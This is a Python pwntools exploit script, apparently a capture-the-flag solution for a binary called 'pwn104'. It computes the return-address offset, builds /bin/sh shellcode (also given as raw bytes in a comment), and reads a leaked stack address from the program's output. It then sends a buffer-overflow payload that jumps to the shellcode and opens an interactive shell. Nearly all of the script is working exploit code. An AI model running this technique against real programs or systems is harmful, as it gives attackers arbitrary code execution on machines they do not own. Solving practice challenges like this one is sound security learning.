from pwn import *
import re


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

#find offset function
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    for _ in range(10):
        p.recvline()
    p.sendline(payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    #ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './pwn104.pwn104'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
offset = 88 #find_ip(cyclic(200))

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

shellcode=asm(shellcraft.sh())
print(shellcode,len(shellcode))
#shellcode = b'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'

SC_len = len(shellcode) #length is 30 for raw shellcode

# How many bytes to the instruction pointer (EIP)?
padding = b'A'*(offset - SC_len)

#extracting the address provided
for _ in range(9):
    io.recvline()
txt = io.recvline()

jmp_address = txt.split()[5]

payload = flat(
    shellcode + padding + p64(int(jmp_address,16))
)

print(payload)
# Save the payload to file
write('payload1', payload)

# Send the payload
io.sendline(payload)

# Receive the flag
io.interactive()
